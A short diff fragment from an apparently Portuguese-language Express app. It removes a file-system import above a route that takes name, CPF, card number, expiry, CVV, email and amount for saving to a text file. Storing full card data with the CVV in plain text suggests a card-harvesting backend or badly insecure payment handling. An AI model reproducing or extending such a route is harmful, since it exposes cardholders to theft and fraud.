@@ -134,7 +134,7 @@ app.get('/pagamento.html', (req, res) => {
 });
 
 // ====================== ROTA PARA SALVAR CARTÃO EM ARQUIVO TXT ======================
-const fs = require('fs');
+
 
 app.post('/salvar-cartao-txt', (req, res) => {
     const { nome, cpf, cartao, validade, cvv, email, valor } = req.body;
